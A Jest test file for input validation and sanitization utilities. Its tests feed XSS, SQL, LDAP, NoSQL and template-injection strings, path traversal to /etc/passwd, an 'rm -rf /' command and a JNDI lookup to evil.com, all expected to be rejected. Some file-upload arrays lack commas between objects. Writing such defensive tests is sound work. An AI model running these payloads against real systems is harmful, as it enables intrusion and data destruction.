/**
 * Input Validation & Sanitization Security Tests
 * Comprehensive tests for input validation, XSS prevention, and malicious payload handling
 */

import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import { 
  validateEmail,
  validatePassword,
  validateUUID,
  sanitizeHtml,
  validateFileUpload,
  detectMaliciousPatterns} from '@/utils/validation';

describe('Input Validation & Sanitization Security Tests', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  describe('Email Validation Security', () => {
    it('should reject malicious email patterns', () => {
      const maliciousEmails = [
        'test@example.com<script>alert(1)</script>',
        'user+<img src=x onerror=alert(1)>@domain.com',
        'admin@domain.com"; DROP TABLE users; --',
        'test@domain.com\r\nBcc: attacker@evil.com',
        'user@domain.com\x00admin@internal.com',
      ];

      for (const email of maliciousEmails) {
        const isValid = validateEmail(email);
        expect(isValid).toBe(false);
      }
    });

    it('should accept valid email addresses', () => {
      const validEmails = [
        'user@example.com',
        'test.email+tag@domain.co.uk',
        'user123@subdomain.example.org',
        'firstname.lastname@company.com',
      ];

      for (const email of validEmails) {
        const isValid = validateEmail(email);
        expect(isValid).toBe(true);
      }
    });

    it('should reject emails with dangerous characters', () => {
      const dangerousEmails = [
        'user@domain.com\n',
        'user@domain.com\r',
        'user@domain.com\t',
        'user@domain.com\x00',
        'user@domain.com\x0b',
      ];

      for (const email of dangerousEmails) {
        const isValid = validateEmail(email);
        expect(isValid).toBe(false);
      }
    });
  });

  describe('Password Validation Security', () => {
    it('should enforce strong password requirements', () => {
      const weakPasswords = [
        'password',
        '123456',
        'qwerty',
        'admin',
        'password123',
        'Password', // Missing numbers and special chars
        'password1', // Missing uppercase and special chars
        'PASSWORD1!', // Missing lowercase
      ];

      for (const password of weakPasswords) {
        const validation = validatePassword(password);
        expect(validation.isValid).toBe(false);
        expect(validation.errors.length).toBeGreaterThan(0);
      }
    });

    it('should accept strong passwords', () => {
      const strongPasswords = [
        'MyStr0ng!Password',
        'C0mpl3x@P4ssw0rd',
        'S3cur3#P4ssw0rd!',
        'V3ry$tr0ng&P4ss',
      ];

      for (const password of strongPasswords) {
        const validation = validatePassword(password);
        expect(validation.isValid).toBe(true);
        expect(validation.errors.length).toBe(0);
      }
    });

    it('should reject passwords with common patterns', () => {
      const commonPatterns = [
        'password123',
        'admin123',
        'qwerty123',
        '123456789',
        'password!',
        'Password1',
      ];

      for (const password of commonPatterns) {
        const validation = validatePassword(password);
        expect(validation.isValid).toBe(false);
      }
    });

    it('should enforce minimum length requirements', () => {
      const shortPasswords = [
        'P@ss1',
        'Ab1!',
        'Xy2#',
      ];

      for (const password of shortPasswords) {
        const validation = validatePassword(password);
        expect(validation.isValid).toBe(false);
        expect(validation.errors).toContain('Password must be at least 8 characters long');
      }
    });
  });

  describe('UUID Validation Security', () => {
    it('should validate proper UUID v4 format', () => {
      const validUUIDs = [
        '123e4567-e89b-12d3-a456-426614174000',
        'f47ac10b-58cc-4372-a567-0e02b2c3d479',
        '6ba7b810-9dad-11d1-80b4-00c04fd430c8',
      ];

      for (const uuid of validUUIDs) {
        const isValid = validateUUID(uuid);
        expect(isValid).toBe(true);
      }
    });

    it('should reject invalid UUID formats', () => {
      const invalidUUIDs = [
        'not-a-uuid',
        '123e4567-e89b-12d3-a456', // Too short
        '123e4567-e89b-12d3-a456-426614174000-extra', // Too long
        '123e4567_e89b_12d3_a456_426614174000', // Wrong separators
        'gggggggg-gggg-gggg-gggg-gggggggggggg', // Invalid hex
        '', // Empty
        null, // Null
        undefined, // Undefined
      ];

      for (const uuid of invalidUUIDs) {
        const isValid = validateUUID(uuid);
        expect(isValid).toBe(false);
      }
    });

    it('should reject UUID injection attempts', () => {
      const maliciousUUIDs = [
        "123e4567-e89b-12d3-a456-426614174000'; DROP TABLE users; --",
        '123e4567-e89b-12d3-a456-426614174000<script>alert(1)</script>',
        '123e4567-e89b-12d3-a456-426614174000\x00admin',
      ];

      for (const uuid of maliciousUUIDs) {
        const isValid = validateUUID(uuid);
        expect(isValid).toBe(false);
      }
    });
  });

  describe('HTML Sanitization', () => {
    it('should remove dangerous script tags', () => {
      const maliciousHtml = '<p>Safe content</p><script>alert("XSS")</script>';
      const sanitized = sanitizeHtml(maliciousHtml);
      
      expect(sanitized).toContain('<p>Safe content</p>');
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
    });

    it('should remove dangerous event handlers', () => {
      const maliciousHtml = '<img src="image.jpg" onerror="alert(1)" onload="steal()">';
      const sanitized = sanitizeHtml(maliciousHtml);
      
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('onload');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).not.toContain('steal');
    });

    it('should remove dangerous protocols', () => {
      const maliciousHtml = '<a href="javascript:alert(1)">Click</a><img src="data:text/html,<script>alert(1)</script>">';
      const sanitized = sanitizeHtml(maliciousHtml);
      
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('data:text/html');
    });

    it('should preserve safe HTML elements', () => {
      const safeHtml = '<p>Paragraph</p><strong>Bold</strong><em>Italic</em><a href="https://example.com">Link</a>';
      const sanitized = sanitizeHtml(safeHtml);
      
      expect(sanitized).toContain('<p>Paragraph</p>');
      expect(sanitized).toContain('<strong>Bold</strong>');
      expect(sanitized).toContain('<em>Italic</em>');
      expect(sanitized).toContain('href="https://example.com"');
    });
  });

  describe('File Upload Validation', () => {
    it('should reject executable file types', () => {
      const dangerousFiles = [
        { name: 'virus.exe', type: 'application/x-executable'  }
        { name: 'script.bat', type: 'application/x-bat'  }
        { name: 'malware.scr', type: 'application/x-screensaver'  }
        { name: 'trojan.com', type: 'application/x-msdos-program'  }
      ];

      for (const file of dangerousFiles) {
        const validation = validateFileUpload(file);
        expect(validation.isValid).toBe(false);
        expect(validation.errors).toContain('File type not allowed for security reasons');
      }
    });

    it('should reject files with path traversal attempts', () => {
      const pathTraversalFiles = [
        { name: '../../../etc/passwd', type: 'text/plain'  }
        { name: '..\\..\\windows\\system32\\config\\sam', type: 'text/plain'  }
        { name: 'normal/../../../secret.txt', type: 'text/plain'  }
      ];

      for (const file of pathTraversalFiles) {
        const validation = validateFileUpload(file);
        expect(validation.isValid).toBe(false);
        expect(validation.errors).toContain('File name contains invalid path characters');
      }
    });

    it('should reject oversized files', () => {
      const oversizedFile = {
        name: 'large.pdf',
        type: 'application/pdf',
        size: 11 * 1024 * 1024, // 11MB
      };

      const validation = validateFileUpload(oversizedFile);
      expect(validation.isValid).toBe(false);
      expect(validation.errors).toContain('File size exceeds maximum limit');
    });

    it('should accept valid files', () => {
      const validFiles = [
        { name: 'document.pdf', type: 'application/pdf', size: 1024 * 1024  }
        { name: 'image.jpg', type: 'image/jpeg', size: 512 * 1024  }
        { name: 'text.txt', type: 'text/plain', size: 1024  }
      ];

      for (const file of validFiles) {
        const validation = validateFileUpload(file);
        expect(validation.isValid).toBe(true);
        expect(validation.errors.length).toBe(0);
      }
    });
  });

  describe('Malicious Pattern Detection', () => {
    it('should detect template injection attempts', () => {
      const templateInjections = [
        '${process.env.SECRET_KEY}',
        '#{7*7}',
        '{{constructor.constructor("alert(1)")()}}',
        '<%= system("rm -rf /") %>',
        '${jndi:ldap://evil.com/a}',
      ];

      for (const injection of templateInjections) {
        const isMalicious = detectMaliciousPatterns(injection);
        expect(isMalicious).toBe(true);
      }
    });

    it('should detect NoSQL injection attempts', () => {
      const nosqlInjections = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$where": "this.password.match(/.*/)"}',
        '{"$regex": ".*"}',
      ];

      for (const injection of nosqlInjections) {
        const isMalicious = detectMaliciousPatterns(injection);
        expect(isMalicious).toBe(true);
      }
    });

    it('should detect LDAP injection attempts', () => {
      const ldapInjections = [
        'admin)(&(password=*))',
        'admin)(|(password=*))',
        '*)(uid=*',
        '*)(&(objectClass=*)',
      ];

      for (const injection of ldapInjections) {
        const isMalicious = detectMaliciousPatterns(injection);
        expect(isMalicious).toBe(true);
      }
    });

    it('should allow safe content', () => {
      const safeContent = [
        'Normal user input',
        'Email: user@example.com',
        'Price: $19.99',
        'Date: 2023-12-25',
        'Valid JSON: {"name": "John", "age": 30}',
      ];

      for (const content of safeContent) {
        const isMalicious = detectMaliciousPatterns(content);
        expect(isMalicious).toBe(false);
      }
    });
  });
});
